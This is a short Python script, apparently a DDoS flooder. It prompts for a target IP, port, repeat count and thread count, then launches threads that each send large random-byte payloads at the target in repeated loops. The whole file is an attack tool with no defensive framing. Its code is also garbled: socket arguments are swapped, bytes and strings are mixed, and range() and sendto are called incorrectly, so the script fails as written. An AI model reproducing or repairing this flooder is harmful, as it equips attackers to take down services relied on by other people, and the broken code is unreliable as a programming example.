import os; import socket; import time; import random; import threading; import sys

ip = str(input('IP: '))
port = int(input('Port: '))
times = int(input('Times: '))
hit = int(input('Thread: '))

def ddos():
    s = socket.socket(socket.SOCK_DGRAM, socket.AF_INET)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    threads = random._urandom(60000)
    byte = random._urandom(10500)
    data = byte + threads + '\r\n'
    try:
        s.send(str.encode(data))
        s.sendall(str.encode(data))
        for x in range():
            s.sendto(str(ip), int(port))
            s.sendall(str.encode(data))
            for i in range(times):
                s.send(str.encode(data))
                s.send(str.encode(data))
                s.send(str.encode(data))
                s.send(str.encode(data))
                s.send(str.encode(data))
                s.sendall(str.encode(data))
                s.sendall(str.encode(data))

                s.sendall(str.encode(data))

                s.sendall(str.encode(data))

                s.sendall(str.encode(data))
    except:
        s.close()
        pass

for y in range(hit):
    th = threading.Thread(target=ddos)
    th.start()
